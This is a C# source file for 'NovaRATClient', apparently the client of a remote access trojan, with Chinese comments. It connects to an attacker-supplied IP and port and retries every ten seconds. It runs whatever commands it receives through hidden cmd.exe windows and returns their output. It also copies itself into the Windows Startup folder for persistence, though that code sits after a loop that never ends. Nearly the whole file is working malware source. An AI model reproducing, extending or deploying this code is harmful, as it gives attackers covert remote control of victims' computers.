using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Reflection;
using System.IO;

namespace ClientLib
{
    public class NovaRATClient
    {
        public static string ip = "";
        public static int port = 0;
        public static void Main(string[] args)
        {
            Start(args[0], int.Parse(args[1]) );

            string appPath = Assembly.GetExecutingAssembly().Location;
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string targetPath = Path.Combine(startupFolderPath, Path.GetFileName(appPath));
            try
            {
                if (!File.Exists(targetPath))
                {
                    File.Copy(appPath, targetPath);
                }
            }catch{}
        }
        public static void Start(string ip_, int port_)
        {
            NovaRATClient.ip = ip_;
            NovaRATClient.port = port_;
            StartClient();
        }
        private static void StartClient()
        {
            Console.WriteLine("Started");
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.Connect(NovaRATClient.ip, NovaRATClient.port);
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[1024];
                    while (true)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            Console.WriteLine(response);

                            string[] parts = response.Split('|');
                            if (parts.Length >= 2 && parts[0].Trim().ToLower() == "command")
                            {
                                string command = parts[1].Trim();

                                string result = RunCommand(command);

                                byte[] resultBytes = Encoding.UTF8.GetBytes(result);
                                stream.Write(resultBytes, 0, resultBytes.Length);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接错误: " + ex.Message);
                    Thread.Sleep(10000);
                }
            }
        }
        static string RunCommand(string command)
        {
            string result = string.Empty;
            try
            {
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe", // CMD执行程序
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        Arguments = "/c " + command // /c 参数表示执行完命令后关闭CMD窗口
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    result += "\n" + output;
                }

                if (!string.IsNullOrEmpty(error))
                {
                    result += "错误输出:\n" + error;
                }
            }
            catch (Exception ex)
            {
                result = "错误: " + ex.Message;
            }
            return result;
        }

    }

}
